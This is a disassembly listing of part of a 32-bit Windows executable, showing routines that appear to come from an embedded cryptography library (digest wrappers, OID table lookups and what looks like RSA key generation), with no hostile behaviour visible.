  406f69:	ff 70 0c             	push   0xc(%eax)
  406f6c:	56                   	push   %esi
  406f6d:	ff 77 04             	push   0x4(%edi)
  406f70:	ff 50 14             	call   *0x14(%eax)
  406f73:	8b 07                	mov    (%edi),%eax
  406f75:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  406f78:	ff 70 08             	push   0x8(%eax)
  406f7b:	51                   	push   %ecx
  406f7c:	ff 77 04             	push   0x4(%edi)
  406f7f:	ff 50 14             	call   *0x14(%eax)
  406f82:	ff 75 0c             	push   0xc(%ebp)
  406f85:	8b 07                	mov    (%edi),%eax
  406f87:	ff 77 04             	push   0x4(%edi)
  406f8a:	ff 50 18             	call   *0x18(%eax)
  406f8d:	33 c0                	xor    %eax,%eax
  406f8f:	5e                   	pop    %esi
  406f90:	eb 05                	jmp    0x406f97
  406f92:	b8 00 af ff ff       	mov    $0xffffaf00,%eax
  406f97:	5f                   	pop    %edi
  406f98:	8b e5                	mov    %ebp,%esp
  406f9a:	5d                   	pop    %ebp
  406f9b:	c2 08 00             	ret    $0x8
  406f9e:	56                   	push   %esi
  406f9f:	8b 74 24 08          	mov    0x8(%esp),%esi
  406fa3:	57                   	push   %edi
  406fa4:	85 f6                	test   %esi,%esi
  406fa6:	74 23                	je     0x406fcb
  406fa8:	8b 06                	mov    (%esi),%eax
  406faa:	85 c0                	test   %eax,%eax
  406fac:	74 1d                	je     0x406fcb
  406fae:	8b 7e 08             	mov    0x8(%esi),%edi
  406fb1:	85 ff                	test   %edi,%edi
  406fb3:	74 16                	je     0x406fcb
  406fb5:	ff 76 04             	push   0x4(%esi)
  406fb8:	ff 50 10             	call   *0x10(%eax)
  406fbb:	8b 06                	mov    (%esi),%eax
  406fbd:	ff 70 0c             	push   0xc(%eax)
  406fc0:	57                   	push   %edi
  406fc1:	ff 76 04             	push   0x4(%esi)
  406fc4:	ff 50 14             	call   *0x14(%eax)
  406fc7:	33 c0                	xor    %eax,%eax
  406fc9:	eb 05                	jmp    0x406fd0
  406fcb:	b8 00 af ff ff       	mov    $0xffffaf00,%eax
  406fd0:	5f                   	pop    %edi
  406fd1:	5e                   	pop    %esi
  406fd2:	c2 04 00             	ret    $0x4
  406fd5:	55                   	push   %ebp
  406fd6:	8b ec                	mov    %esp,%ebp
  406fd8:	83 ec 0c             	sub    $0xc,%esp
  406fdb:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  406fdf:	75 07                	jne    0x406fe8
  406fe1:	b8 00 af ff ff       	mov    $0xffffaf00,%eax
  406fe6:	eb 50                	jmp    0x407038
  406fe8:	8d 45 f4             	lea    -0xc(%ebp),%eax
  406feb:	50                   	push   %eax
  406fec:	e8 a0 fc ff ff       	call   0x406c91
  406ff1:	6a 01                	push   $0x1
  406ff3:	ff 75 08             	push   0x8(%ebp)
  406ff6:	8d 45 f4             	lea    -0xc(%ebp),%eax
  406ff9:	50                   	push   %eax
  406ffa:	e8 eb fc ff ff       	call   0x406cea
  406fff:	85 c0                	test   %eax,%eax
  407001:	75 35                	jne    0x407038
  407003:	ff 75 10             	push   0x10(%ebp)
  407006:	8d 45 f4             	lea    -0xc(%ebp),%eax
  407009:	ff 75 0c             	push   0xc(%ebp)
  40700c:	50                   	push   %eax
  40700d:	e8 1f fe ff ff       	call   0x406e31
  407012:	ff 75 18             	push   0x18(%ebp)
  407015:	8d 45 f4             	lea    -0xc(%ebp),%eax
  407018:	ff 75 14             	push   0x14(%ebp)
  40701b:	50                   	push   %eax
  40701c:	e8 e5 fe ff ff       	call   0x406f06
  407021:	ff 75 1c             	push   0x1c(%ebp)
  407024:	8d 45 f4             	lea    -0xc(%ebp),%eax
  407027:	50                   	push   %eax
  407028:	e8 07 ff ff ff       	call   0x406f34
  40702d:	8d 45 f4             	lea    -0xc(%ebp),%eax
  407030:	50                   	push   %eax
  407031:	e8 6e fc ff ff       	call   0x406ca4
  407036:	33 c0                	xor    %eax,%eax
  407038:	8b e5                	mov    %ebp,%esp
  40703a:	5d                   	pop    %ebp
  40703b:	c2 18 00             	ret    $0x18
  40703e:	8b 44 24 04          	mov    0x4(%esp),%eax
  407042:	85 c0                	test   %eax,%eax
  407044:	74 14                	je     0x40705a
  407046:	8b 08                	mov    (%eax),%ecx
  407048:	85 c9                	test   %ecx,%ecx
  40704a:	74 0e                	je     0x40705a
  40704c:	ff 74 24 08          	push   0x8(%esp)
  407050:	ff 70 04             	push   0x4(%eax)
  407053:	ff 51 2c             	call   *0x2c(%ecx)
  407056:	33 c0                	xor    %eax,%eax
  407058:	eb 05                	jmp    0x40705f
  40705a:	b8 00 af ff ff       	mov    $0xffffaf00,%eax
  40705f:	c2 08 00             	ret    $0x8
  407062:	8b 44 24 08          	mov    0x8(%esp),%eax
  407066:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40706a:	85 c0                	test   %eax,%eax
  40706c:	74 07                	je     0x407075
  40706e:	c6 01 00             	movb   $0x0,(%ecx)
  407071:	41                   	inc    %ecx
  407072:	48                   	dec    %eax
  407073:	75 f9                	jne    0x40706e
  407075:	c2 08 00             	ret    $0x8
  407078:	6a 01                	push   $0x1
  40707a:	ff 74 24 08          	push   0x8(%esp)
  40707e:	e8 00 0c 00 00       	call   0x407c83
  407083:	c2 04 00             	ret    $0x4
  407086:	e9 83 0c 00 00       	jmp    0x407d0e
  40708b:	e9 2a 0d 00 00       	jmp    0x407dba
  407090:	6a 01                	push   $0x1
  407092:	ff 74 24 10          	push   0x10(%esp)
  407096:	ff 74 24 10          	push   0x10(%esp)
  40709a:	ff 74 24 10          	push   0x10(%esp)
  40709e:	e8 51 18 00 00       	call   0x4088f4
  4070a3:	c2 0c 00             	ret    $0xc
  4070a6:	56                   	push   %esi
  4070a7:	6a 6c                	push   $0x6c
  4070a9:	6a 01                	push   $0x1
  4070ab:	e8 9b b6 ff ff       	call   0x40274b
  4070b0:	8b f0                	mov    %eax,%esi
  4070b2:	59                   	pop    %ecx
  4070b3:	59                   	pop    %ecx
  4070b4:	85 f6                	test   %esi,%esi
  4070b6:	74 06                	je     0x4070be
  4070b8:	56                   	push   %esi
  4070b9:	e8 89 0b 00 00       	call   0x407c47
  4070be:	8b c6                	mov    %esi,%eax
  4070c0:	5e                   	pop    %esi
  4070c1:	c3                   	ret
  4070c2:	ff 74 24 04          	push   0x4(%esp)
  4070c6:	e8 8f 0b 00 00       	call   0x407c5a
  4070cb:	ff 74 24 04          	push   0x4(%esp)
  4070cf:	e8 91 b6 ff ff       	call   0x402765
  4070d4:	59                   	pop    %ecx
  4070d5:	c2 04 00             	ret    $0x4
  4070d8:	e9 92 0b 00 00       	jmp    0x407c6f
  4070dd:	e9 3b 0e 00 00       	jmp    0x407f1d
  4070e2:	6a 00                	push   $0x0
  4070e4:	ff 74 24 08          	push   0x8(%esp)
  4070e8:	e8 96 0b 00 00       	call   0x407c83
  4070ed:	c2 04 00             	ret    $0x4
  4070f0:	6a 00                	push   $0x0
  4070f2:	ff 74 24 10          	push   0x10(%esp)
  4070f6:	ff 74 24 10          	push   0x10(%esp)
  4070fa:	ff 74 24 10          	push   0x10(%esp)
  4070fe:	e8 f1 17 00 00       	call   0x4088f4
  407103:	c2 0c 00             	ret    $0xc
  407106:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  40710a:	53                   	push   %ebx
  40710b:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  40710f:	56                   	push   %esi
  407110:	83 79 04 00          	cmpl   $0x0,0x4(%ecx)
  407114:	57                   	push   %edi
  407115:	8b 7c 24 14          	mov    0x14(%esp),%edi
  407119:	8b f7                	mov    %edi,%esi
  40711b:	76 2e                	jbe    0x40714b
  40711d:	8b 41 08             	mov    0x8(%ecx),%eax
  407120:	6a 28                	push   $0x28
  407122:	59                   	pop    %ecx
  407123:	0f b6 00             	movzbl (%eax),%eax
  407126:	99                   	cltd
  407127:	f7 f9                	idiv   %ecx
  407129:	52                   	push   %edx
  40712a:	50                   	push   %eax
  40712b:	68 9c 1e 40 00       	push   $0x401e9c
  407130:	57                   	push   %edi
  407131:	53                   	push   %ebx
  407132:	ff 15 18 11 40 00    	call   *0x401118
  407138:	83 c4 14             	add    $0x14,%esp
  40713b:	85 c0                	test   %eax,%eax
  40713d:	78 6b                	js     0x4071aa
  40713f:	3b c7                	cmp    %edi,%eax
  407141:	73 67                	jae    0x4071aa
  407143:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  407147:	2b f0                	sub    %eax,%esi
  407149:	03 d8                	add    %eax,%ebx
  40714b:	55                   	push   %ebp
  40714c:	33 ed                	xor    %ebp,%ebp
  40714e:	33 d2                	xor    %edx,%edx
  407150:	45                   	inc    %ebp
  407151:	39 69 04             	cmp    %ebp,0x4(%ecx)
  407154:	76 49                	jbe    0x40719f
  407156:	8b c2                	mov    %edx,%eax
  407158:	25 ff ff ff 01       	and    $0x1ffffff,%eax
  40715d:	3b c2                	cmp    %edx,%eax
  40715f:	75 4e                	jne    0x4071af
  407161:	8b 41 08             	mov    0x8(%ecx),%eax
  407164:	c1 e2 07             	shl    $0x7,%edx
  407167:	8a 0c 28             	mov    (%eax,%ebp,1),%cl
  40716a:	0f b6 c1             	movzbl %cl,%eax
  40716d:	83 e0 7f             	and    $0x7f,%eax
  407170:	03 d0                	add    %eax,%edx
  407172:	84 c9                	test   %cl,%cl
  407174:	78 1f                	js     0x407195
  407176:	52                   	push   %edx
  407177:	68 a4 1e 40 00       	push   $0x401ea4
  40717c:	56                   	push   %esi
  40717d:	53                   	push   %ebx
  40717e:	ff 15 18 11 40 00    	call   *0x401118
  407184:	83 c4 10             	add    $0x10,%esp
  407187:	85 c0                	test   %eax,%eax
  407189:	78 24                	js     0x4071af
  40718b:	3b c6                	cmp    %esi,%eax
  40718d:	73 20                	jae    0x4071af
  40718f:	2b f0                	sub    %eax,%esi
  407191:	03 d8                	add    %eax,%ebx
  407193:	33 d2                	xor    %edx,%edx
  407195:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  407199:	45                   	inc    %ebp
  40719a:	3b 69 04             	cmp    0x4(%ecx),%ebp
  40719d:	72 b7                	jb     0x407156
  40719f:	2b fe                	sub    %esi,%edi
  4071a1:	8b c7                	mov    %edi,%eax
  4071a3:	5d                   	pop    %ebp
  4071a4:	5f                   	pop    %edi
  4071a5:	5e                   	pop    %esi
  4071a6:	5b                   	pop    %ebx
  4071a7:	c2 0c 00             	ret    $0xc
  4071aa:	6a f5                	push   $0xfffffff5
  4071ac:	58                   	pop    %eax
  4071ad:	eb f5                	jmp    0x4071a4
  4071af:	6a f5                	push   $0xfffffff5
  4071b1:	58                   	pop    %eax
  4071b2:	eb ef                	jmp    0x4071a3
  4071b4:	ff 74 24 04          	push   0x4(%esp)
  4071b8:	e8 82 01 00 00       	call   0x40733f
  4071bd:	85 c0                	test   %eax,%eax
  4071bf:	75 05                	jne    0x4071c6
  4071c1:	6a d2                	push   $0xffffffd2
  4071c3:	58                   	pop    %eax
  4071c4:	eb 0b                	jmp    0x4071d1
  4071c6:	8b 48 10             	mov    0x10(%eax),%ecx
  4071c9:	8b 44 24 08          	mov    0x8(%esp),%eax
  4071cd:	89 08                	mov    %ecx,(%eax)
  4071cf:	33 c0                	xor    %eax,%eax
  4071d1:	c2 08 00             	ret    $0x8
  4071d4:	83 3d e0 1c 40 00 00 	cmpl   $0x0,0x401ce0
  4071db:	ba e0 1c 40 00       	mov    $0x401ce0,%edx
  4071e0:	74 11                	je     0x4071f3
  4071e2:	8b 44 24 04          	mov    0x4(%esp),%eax
  4071e6:	39 42 10             	cmp    %eax,0x10(%edx)
  4071e9:	74 0e                	je     0x4071f9
  4071eb:	83 c2 14             	add    $0x14,%edx
  4071ee:	83 3a 00             	cmpl   $0x0,(%edx)
  4071f1:	75 f3                	jne    0x4071e6
  4071f3:	6a d2                	push   $0xffffffd2
  4071f5:	58                   	pop    %eax
  4071f6:	c2 0c 00             	ret    $0xc
  4071f9:	8b 44 24 08          	mov    0x8(%esp),%eax
  4071fd:	8b 0a                	mov    (%edx),%ecx
  4071ff:	89 08                	mov    %ecx,(%eax)
  407201:	8b 44 24 0c          	mov    0xc(%esp),%eax
  407205:	8b 4a 04             	mov    0x4(%edx),%ecx
  407208:	89 08                	mov    %ecx,(%eax)
  40720a:	33 c0                	xor    %eax,%eax
  40720c:	eb e8                	jmp    0x4071f6
  40720e:	ff 74 24 04          	push   0x4(%esp)
  407212:	e8 df 00 00 00       	call   0x4072f6
  407217:	8b d0                	mov    %eax,%edx
  407219:	85 d2                	test   %edx,%edx
  40721b:	75 05                	jne    0x407222
  40721d:	6a d2                	push   $0xffffffd2
  40721f:	58                   	pop    %eax
  407220:	eb 14                	jmp    0x407236
  407222:	8b 44 24 08          	mov    0x8(%esp),%eax
  407226:	8b 4a 10             	mov    0x10(%edx),%ecx
  407229:	89 08                	mov    %ecx,(%eax)
  40722b:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40722f:	8b 4a 14             	mov    0x14(%edx),%ecx
  407232:	89 08                	mov    %ecx,(%eax)
  407234:	33 c0                	xor    %eax,%eax
  407236:	c2 0c 00             	ret    $0xc
  407239:	ff 74 24 04          	push   0x4(%esp)
  40723d:	e8 b4 00 00 00       	call   0x4072f6
  407242:	85 c0                	test   %eax,%eax
  407244:	75 05                	jne    0x40724b
  407246:	6a d2                	push   $0xffffffd2
  407248:	58                   	pop    %eax
  407249:	eb 0b                	jmp    0x407256
  40724b:	8b 48 0c             	mov    0xc(%eax),%ecx
  40724e:	8b 44 24 08          	mov    0x8(%esp),%eax
  407252:	89 08                	mov    %ecx,(%eax)
  407254:	33 c0                	xor    %eax,%eax
  407256:	c2 08 00             	ret    $0x8
  407259:	83 3d 80 1c 40 00 00 	cmpl   $0x0,0x401c80
  407260:	ba 80 1c 40 00       	mov    $0x401c80,%edx
  407265:	74 1a                	je     0x407281
  407267:	8b 44 24 08          	mov    0x8(%esp),%eax
  40726b:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40726f:	39 4a 14             	cmp    %ecx,0x14(%edx)
  407272:	75 05                	jne    0x407279
  407274:	39 42 10             	cmp    %eax,0x10(%edx)
  407277:	74 0e                	je     0x407287
  407279:	83 c2 18             	add    $0x18,%edx
  40727c:	83 3a 00             	cmpl   $0x0,(%edx)
  40727f:	75 ee                	jne    0x40726f
  407281:	6a d2                	push   $0xffffffd2
  407283:	58                   	pop    %eax
  407284:	c2 10 00             	ret    $0x10
  407287:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40728b:	8b 0a                	mov    (%edx),%ecx
  40728d:	89 08                	mov    %ecx,(%eax)
  40728f:	8b 44 24 10          	mov    0x10(%esp),%eax
  407293:	8b 4a 04             	mov    0x4(%edx),%ecx
  407296:	89 08                	mov    %ecx,(%eax)
  407298:	33 c0                	xor    %eax,%eax
  40729a:	eb e8                	jmp    0x407284
  40729c:	ff 74 24 04          	push   0x4(%esp)
  4072a0:	e8 e3 00 00 00       	call   0x407388
  4072a5:	85 c0                	test   %eax,%eax
  4072a7:	75 05                	jne    0x4072ae
  4072a9:	6a d2                	push   $0xffffffd2
  4072ab:	58                   	pop    %eax
  4072ac:	eb 0b                	jmp    0x4072b9
  4072ae:	8b 48 10             	mov    0x10(%eax),%ecx
  4072b1:	8b 44 24 08          	mov    0x8(%esp),%eax
  4072b5:	89 08                	mov    %ecx,(%eax)
  4072b7:	33 c0                	xor    %eax,%eax
  4072b9:	c2 08 00             	ret    $0x8
  4072bc:	83 3d 30 1d 40 00 00 	cmpl   $0x0,0x401d30
  4072c3:	ba 30 1d 40 00       	mov    $0x401d30,%edx
  4072c8:	74 11                	je     0x4072db
  4072ca:	8b 44 24 04          	mov    0x4(%esp),%eax
  4072ce:	39 42 10             	cmp    %eax,0x10(%edx)
  4072d1:	74 0e                	je     0x4072e1
  4072d3:	83 c2 14             	add    $0x14,%edx
  4072d6:	83 3a 00             	cmpl   $0x0,(%edx)
  4072d9:	75 f3                	jne    0x4072ce
  4072db:	6a d2                	push   $0xffffffd2
  4072dd:	58                   	pop    %eax
  4072de:	c2 0c 00             	ret    $0xc
  4072e1:	8b 44 24 08          	mov    0x8(%esp),%eax
  4072e5:	8b 0a                	mov    (%edx),%ecx
  4072e7:	89 08                	mov    %ecx,(%eax)
  4072e9:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4072ed:	8b 4a 04             	mov    0x4(%edx),%ecx
  4072f0:	89 08                	mov    %ecx,(%eax)
  4072f2:	33 c0                	xor    %eax,%eax
  4072f4:	eb e8                	jmp    0x4072de
  4072f6:	56                   	push   %esi
  4072f7:	57                   	push   %edi
  4072f8:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  4072fc:	be 80 1c 40 00       	mov    $0x401c80,%esi
  407301:	8b c6                	mov    %esi,%eax
  407303:	85 ff                	test   %edi,%edi
  407305:	74 2d                	je     0x407334
  407307:	83 3d 80 1c 40 00 00 	cmpl   $0x0,0x401c80
  40730e:	74 24                	je     0x407334
  407310:	8b 4f 04             	mov    0x4(%edi),%ecx
  407313:	39 48 04             	cmp    %ecx,0x4(%eax)
  407316:	75 12                	jne    0x40732a
  407318:	51                   	push   %ecx
  407319:	ff 77 08             	push   0x8(%edi)
  40731c:	ff 30                	push   (%eax)
  40731e:	e8 d5 b2 ff ff       	call   0x4025f8
  407323:	83 c4 0c             	add    $0xc,%esp
  407326:	85 c0                	test   %eax,%eax
  407328:	74 11                	je     0x40733b
  40732a:	83 c6 18             	add    $0x18,%esi
  40732d:	8b c6                	mov    %esi,%eax
  40732f:	83 3e 00             	cmpl   $0x0,(%esi)
  407332:	75 dc                	jne    0x407310
  407334:	33 c0                	xor    %eax,%eax
  407336:	5f                   	pop    %edi
  407337:	5e                   	pop    %esi
  407338:	c2 04 00             	ret    $0x4
  40733b:	8b c6                	mov    %esi,%eax
  40733d:	eb f7                	jmp    0x407336
  40733f:	56                   	push   %esi
  407340:	57                   	push   %edi
  407341:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  407345:	be e0 1c 40 00       	mov    $0x401ce0,%esi
  40734a:	8b c6                	mov    %esi,%eax
  40734c:	85 ff                	test   %edi,%edi
  40734e:	74 2d                	je     0x40737d
  407350:	83 3d e0 1c 40 00 00 	cmpl   $0x0,0x401ce0
  407357:	74 24                	je     0x40737d
  407359:	8b 4f 04             	mov    0x4(%edi),%ecx
  40735c:	39 48 04             	cmp    %ecx,0x4(%eax)
  40735f:	75 12                	jne    0x407373
  407361:	51                   	push   %ecx
  407362:	ff 77 08             	push   0x8(%edi)
  407365:	ff 30                	push   (%eax)
  407367:	e8 8c b2 ff ff       	call   0x4025f8
  40736c:	83 c4 0c             	add    $0xc,%esp
  40736f:	85 c0                	test   %eax,%eax
  407371:	74 11                	je     0x407384
  407373:	83 c6 14             	add    $0x14,%esi
  407376:	8b c6                	mov    %esi,%eax
  407378:	83 3e 00             	cmpl   $0x0,(%esi)
  40737b:	75 dc                	jne    0x407359
  40737d:	33 c0                	xor    %eax,%eax
  40737f:	5f                   	pop    %edi
  407380:	5e                   	pop    %esi
  407381:	c2 04 00             	ret    $0x4
  407384:	8b c6                	mov    %esi,%eax
  407386:	eb f7                	jmp    0x40737f
  407388:	56                   	push   %esi
  407389:	57                   	push   %edi
  40738a:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  40738e:	be 30 1d 40 00       	mov    $0x401d30,%esi
  407393:	8b c6                	mov    %esi,%eax
  407395:	85 ff                	test   %edi,%edi
  407397:	74 2d                	je     0x4073c6
  407399:	83 3d 30 1d 40 00 00 	cmpl   $0x0,0x401d30
  4073a0:	74 24                	je     0x4073c6
  4073a2:	8b 4f 04             	mov    0x4(%edi),%ecx
  4073a5:	39 48 04             	cmp    %ecx,0x4(%eax)
  4073a8:	75 12                	jne    0x4073bc
  4073aa:	51                   	push   %ecx
  4073ab:	ff 77 08             	push   0x8(%edi)
  4073ae:	ff 30                	push   (%eax)
  4073b0:	e8 43 b2 ff ff       	call   0x4025f8
  4073b5:	83 c4 0c             	add    $0xc,%esp
  4073b8:	85 c0                	test   %eax,%eax
  4073ba:	74 11                	je     0x4073cd
  4073bc:	83 c6 14             	add    $0x14,%esi
  4073bf:	8b c6                	mov    %esi,%eax
  4073c1:	83 3e 00             	cmpl   $0x0,(%esi)
  4073c4:	75 dc                	jne    0x4073a2
  4073c6:	33 c0                	xor    %eax,%eax
  4073c8:	5f                   	pop    %edi
  4073c9:	5e                   	pop    %esi
  4073ca:	c2 04 00             	ret    $0x4
  4073cd:	8b c6                	mov    %esi,%eax
  4073cf:	eb f7                	jmp    0x4073c8
  4073d1:	8b 44 24 04          	mov    0x4(%esp),%eax
  4073d5:	a3 18 11 40 00       	mov    %eax,0x401118
  4073da:	33 c0                	xor    %eax,%eax
  4073dc:	c2 04 00             	ret    $0x4
  4073df:	33 c0                	xor    %eax,%eax
  4073e1:	c2 04 00             	ret    $0x4
  4073e4:	c2 04 00             	ret    $0x4
  4073e7:	33 c0                	xor    %eax,%eax
  4073e9:	c3                   	ret
  4073ea:	68 ac 00 00 00       	push   $0xac
  4073ef:	6a 00                	push   $0x0
  4073f1:	ff 74 24 0c          	push   0xc(%esp)
  4073f5:	e8 4d b2 ff ff       	call   0x402647
  4073fa:	83 c4 0c             	add    $0xc,%esp
  4073fd:	e9 00 00 00 00       	jmp    0x407402
  407402:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  407406:	8b 44 24 08          	mov    0x8(%esp),%eax
  40740a:	89 81 a4 00 00 00    	mov    %eax,0xa4(%ecx)
  407410:	8b 44 24 0c          	mov    0xc(%esp),%eax
  407414:	89 81 a8 00 00 00    	mov    %eax,0xa8(%ecx)
  40741a:	c2 0c 00             	ret    $0xc
  40741d:	83 ec 30             	sub    $0x30,%esp
  407420:	83 7c 24 38 00       	cmpl   $0x0,0x38(%esp)
  407425:	56                   	push   %esi
  407426:	57                   	push   %edi
  407427:	0f 84 1f 02 00 00    	je     0x40764c
  40742d:	81 7c 24 48 80 00 00 	cmpl   $0x80,0x48(%esp)
  407434:	00 
  407435:	0f 82 11 02 00 00    	jb     0x40764c
  40743b:	83 7c 24 4c 03       	cmpl   $0x3,0x4c(%esp)
  407440:	0f 8c 06 02 00 00    	jl     0x40764c
  407446:	f6 44 24 48 01       	testb  $0x1,0x48(%esp)
  40744b:	0f 85 fb 01 00 00    	jne    0x40764c
  407451:	8d 44 24 08          	lea    0x8(%esp),%eax
  407455:	50                   	push   %eax
  407456:	e8 4c c5 ff ff       	call   0x4039a7
  40745b:	8d 44 24 14          	lea    0x14(%esp),%eax
  40745f:	50                   	push   %eax
  407460:	e8 42 c5 ff ff       	call   0x4039a7
  407465:	8d 44 24 20          	lea    0x20(%esp),%eax
  407469:	50                   	push   %eax
  40746a:	e8 38 c5 ff ff       	call   0x4039a7
  40746f:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  407473:	50                   	push   %eax
  407474:	e8 2e c5 ff ff       	call   0x4039a7
  407479:	8b 7c 24 3c          	mov    0x3c(%esp),%edi
  40747d:	ff 74 24 4c          	push   0x4c(%esp)
  407481:	8d 47 14             	lea    0x14(%edi),%eax
  407484:	50                   	push   %eax
  407485:	e8 69 c8 ff ff       	call   0x403cf3
  40748a:	8b f0                	mov    %eax,%esi
  40748c:	85 f6                	test   %esi,%esi
  40748e:	0f 85 7a 01 00 00    	jne    0x40760e
  407494:	8b 44 24 48          	mov    0x48(%esp),%eax
  407498:	53                   	push   %ebx
  407499:	d1 e8                	shr    $1,%eax
  40749b:	8d 5f 2c             	lea    0x2c(%edi),%ebx
  40749e:	89 44 24 50          	mov    %eax,0x50(%esp)
  4074a2:	55                   	push   %ebp
  4074a3:	ff 74 24 4c          	push   0x4c(%esp)
  4074a7:	ff 74 24 4c          	push   0x4c(%esp)
  4074ab:	6a 00                	push   $0x0
  4074ad:	50                   	push   %eax
  4074ae:	53                   	push   %ebx
  4074af:	e8 d1 e5 ff ff       	call   0x405a85
  4074b4:	8b f0                	mov    %eax,%esi
  4074b6:	85 f6                	test   %esi,%esi
  4074b8:	0f 85 4e 01 00 00    	jne    0x40760c
  4074be:	ff 74 24 4c          	push   0x4c(%esp)
  4074c2:	8d 6f 38             	lea    0x38(%edi),%ebp
  4074c5:	ff 74 24 4c          	push   0x4c(%esp)
  4074c9:	50                   	push   %eax
  4074ca:	ff 74 24 60          	push   0x60(%esp)
  4074ce:	55                   	push   %ebp
  4074cf:	e8 b1 e5 ff ff       	call   0x405a85
  4074d4:	8b f0                	mov    %eax,%esi
  4074d6:	85 f6                	test   %esi,%esi
  4074d8:	0f 85 2e 01 00 00    	jne    0x40760c
  4074de:	55                   	push   %ebp
  4074df:	53                   	push   %ebx
  4074e0:	e8 66 cf ff ff       	call   0x40444b
  4074e5:	85 c0                	test   %eax,%eax
  4074e7:	0f 84 9f 00 00 00    	je     0x40758c
  4074ed:	55                   	push   %ebp
  4074ee:	8d 47 08             	lea    0x8(%edi),%eax
  4074f1:	53                   	push   %ebx
  4074f2:	50                   	push   %eax
  4074f3:	e8 c7 d2 ff ff       	call   0x4047bf
  4074f8:	8b f0                	mov    %eax,%esi
  4074fa:	85 f6                	test   %esi,%esi
  4074fc:	0f 85 0a 01 00 00    	jne    0x40760c
  407502:	8d 47 08             	lea    0x8(%edi),%eax
  407505:	50                   	push   %eax
  407506:	e8 1b c9 ff ff       	call   0x403e26
  40750b:	3b 44 24 50          	cmp    0x50(%esp),%eax
  40750f:	75 7b                	jne    0x40758c
  407511:	55                   	push   %ebp
  407512:	53                   	push   %ebx
  407513:	e8 33 cf ff ff       	call   0x40444b
  407518:	85 c0                	test   %eax,%eax
  40751a:	79 07                	jns    0x407523
  40751c:	55                   	push   %ebp
  40751d:	53                   	push   %ebx
  40751e:	e8 3d c6 ff ff       	call   0x403b60
  407523:	6a 01                	push   $0x1
  407525:	53                   	push   %ebx
  407526:	8d 44 24 18          	lea    0x18(%esp),%eax
  40752a:	50                   	push   %eax
  40752b:	e8 4a d2 ff ff       	call   0x40477a
  407530:	8b f0                	mov    %eax,%esi
  407532:	85 f6                	test   %esi,%esi
  407534:	0f 85 d2 00 00 00    	jne    0x40760c
  40753a:	6a 01                	push   $0x1
  40753c:	55                   	push   %ebp
  40753d:	8d 44 24 24          	lea    0x24(%esp),%eax
  407541:	50                   	push   %eax
  407542:	e8 33 d2 ff ff       	call   0x40477a
  407547:	8b f0                	mov    %eax,%esi
  407549:	85 f6                	test   %esi,%esi
  40754b:	0f 85 bb 00 00 00    	jne    0x40760c
  407551:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  407555:	50                   	push   %eax
  407556:	8d 44 24 14          	lea    0x14(%esp),%eax
  40755a:	50                   	push   %eax
  40755b:	8d 44 24 30          	lea    0x30(%esp),%eax
  40755f:	50                   	push   %eax
  407560:	e8 5a d2 ff ff       	call   0x4047bf
  407565:	8b f0                	mov    %eax,%esi
  407567:	85 f6                	test   %esi,%esi
  407569:	0f 85 9d 00 00 00    	jne    0x40760c
  40756f:	8d 44 24 28          	lea    0x28(%esp),%eax
  407573:	50                   	push   %eax
  407574:	8d 47 14             	lea    0x14(%edi),%eax
  407577:	50                   	push   %eax
  407578:	8d 44 24 3c          	lea    0x3c(%esp),%eax
  40757c:	50                   	push   %eax
  40757d:	e8 1e df ff ff       	call   0x4054a0
  407582:	8b f0                	mov    %eax,%esi
  407584:	85 f6                	test   %esi,%esi
  407586:	0f 85 80 00 00 00    	jne    0x40760c
  40758c:	6a 01                	push   $0x1
  40758e:	8d 44 24 38          	lea    0x38(%esp),%eax
  407592:	50                   	push   %eax
  407593:	e8 4b cf ff ff       	call   0x4044e3
  407598:	85 c0                	test   %eax,%eax
  40759a:	8b 44 24 54          	mov    0x54(%esp),%eax
  40759e:	0f 85 ff fe ff ff    	jne    0x4074a3
  4075a4:	8d 44 24 28          	lea    0x28(%esp),%eax
  4075a8:	50                   	push   %eax
  4075a9:	8d 47 14             	lea    0x14(%edi),%eax
  4075ac:	50                   	push   %eax
  4075ad:	8d 6f 20             	lea    0x20(%edi),%ebp
  4075b0:	55                   	push   %ebp
  4075b1:	e8 65 e0 ff ff       	call   0x40561b
  4075b6:	8b f0                	mov    %eax,%esi
  4075b8:	85 f6                	test   %esi,%esi
  4075ba:	75 50                	jne    0x40760c
  4075bc:	8d 44 24 10          	lea    0x10(%esp),%eax
  4075c0:	50                   	push   %eax
  4075c1:	55                   	push   %ebp
  4075c2:	8d 47 44             	lea    0x44(%edi),%eax
  4075c5:	50                   	push   %eax
  4075c6:	e8 d7 d7 ff ff       	call   0x404da2
  4075cb:	8b f0                	mov    %eax,%esi
  4075cd:	85 f6                	test   %esi,%esi
  4075cf:	75 3b                	jne    0x40760c
  4075d1:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  4075d5:	50                   	push   %eax
  4075d6:	55                   	push   %ebp
  4075d7:	8d 47 50             	lea    0x50(%edi),%eax
  4075da:	50                   	push   %eax
  4075db:	e8 c2 d7 ff ff       	call   0x404da2
  4075e0:	8b f0                	mov    %eax,%esi
  4075e2:	85 f6                	test   %esi,%esi
  4075e4:	75 26                	jne    0x40760c
  4075e6:	53                   	push   %ebx
  4075e7:	8d 47 38             	lea    0x38(%edi),%eax
  4075ea:	50                   	push   %eax
  4075eb:	8d 47 5c             	lea    0x5c(%edi),%eax
  4075ee:	50                   	push   %eax
  4075ef:	e8 27 e0 ff ff       	call   0x40561b
  4075f4:	8b f0                	mov    %eax,%esi
  4075f6:	85 f6                	test   %esi,%esi
  4075f8:	75 12                	jne    0x40760c
  4075fa:	8d 47 08             	lea    0x8(%edi),%eax
  4075fd:	50                   	push   %eax
  4075fe:	e8 23 c8 ff ff       	call   0x403e26
  407603:	83 c0 07             	add    $0x7,%eax
